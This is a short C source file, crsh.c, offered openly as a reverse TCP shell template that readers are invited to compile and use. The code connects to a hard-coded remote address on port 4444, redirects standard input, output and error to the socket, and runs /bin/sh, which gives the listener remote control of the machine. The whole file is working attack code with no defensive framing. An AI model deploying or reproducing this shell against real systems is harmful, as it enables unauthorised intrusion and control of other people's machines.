
// filename: crsh.c
/*
// CRSH - C Reverse Shell //

basic C code for a reverse tcp shell connection from target host.

this can be considered a template, or you can compile it and use it
so long as the ip and ports are the ones you want.

each phase or step of the code is numbered for readability (assembly compatability),
although if you dont understand any of these files then you shouldnt be using them.

*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void reverse_shell() {
  /* allocate a socket for IPv4/TCP (1) */
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  /* setup the connection structure. (2) */
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(4444); // <-- you can change this if 4444 is not your port

  /* parse the IP address (3) */
  inet_pton(AF_INET, "192.168.22.33", &sin.sin_addr.s_addr); // <-- actually change this ip address?

  /* connect to the remote host (4) */
  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

  /* duplicate the socket to STDIO (5) */
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);

  /* setup and execute a shell. (6) */
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}